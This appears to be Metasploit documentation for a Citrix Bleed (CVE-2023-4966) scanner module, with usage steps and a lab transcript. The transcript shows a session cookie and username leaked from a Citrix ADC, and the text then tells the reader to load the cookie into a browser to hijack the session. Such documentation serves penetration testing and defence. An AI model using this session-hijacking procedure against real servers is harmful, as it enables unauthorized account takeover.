## Vulnerable Application

This module scans for a vulnerability that allows a remote, unauthenticated attacker to leak memory for a target Citrix
ADC server. The leaked memory is then scanned for session cookies which can be hijacked if found.

## Verification Steps
Example steps in this format (is also in the PR):

1. Install the application
2. Start msfconsole
3. Do: `use auxiliary/scanner/http/citrix_bleed_cve_2023_4966`
4. Do: `set RHOSTS`
5. Do: `run`

## Options

## Scenarios
Specific demo of using the module that might be useful in a real world scenario.

### Citrix ADC 13.1-48.47

NetScaler VPX instance for VMware ESX from `NSVPX-ESX-13.1-48.47_nc_64`.

```
msf6 auxiliary(scanner/http/citrix_bleed_cve_2023_4966) > show options 

Module options (auxiliary/scanner/http/citrix_bleed_cve_2023_4966):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.159.150  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path
   THREADS    20               yes       The number of concurrent threads (max one per host)
   VHOST                       no        HTTP server virtual host


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/http/citrix_bleed_cve_2023_4966) > run

[+] Cookie: NSC_AAAC=fdac8de9ed76012688b4d33e9d5f74b00c3a0818745525d5f4f58455e445a4a42 Username: metasploit
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/citrix_bleed_cve_2023_4966) >
```

Once the cookie has been leaked, load it into the browser using the developer tools.
